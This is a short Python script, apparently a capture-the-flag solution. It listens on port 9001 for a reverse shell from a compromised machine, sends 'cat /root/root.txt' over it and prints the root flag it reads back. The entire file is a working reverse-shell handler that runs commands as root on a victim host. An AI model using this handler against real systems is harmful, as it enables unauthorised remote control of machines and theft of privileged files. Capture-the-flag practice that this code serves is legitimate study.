import socket
from time import sleep

class Revsh(object):
    
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 9001
        self.buffer_size = 1024 * 512
        self.s = socket.socket()
        
        self.s.bind((self.host, self.port))
        self.s.listen(15)

        self.client_socket, self.client_address = self.s.accept()
        
    def send_command(self):
        self.client_socket.send(b"\n")
        _ = self.client_socket.recv(self.buffer_size).decode()
        command = "cat /root/root.txt"
        self.client_socket.send(command.encode('utf-8') + b"\n")
        _ = self.client_socket.recv(self.buffer_size).decode()
        self.client_socket.send(b"\n")
        
        output = self.client_socket.recv(self.buffer_size).decode()
        flag = output.split("\n")[1]
        print(f"Root flag: {flag}")
        
if __name__ == "__main__":
     revsh = Revsh()
     revsh.send_command()
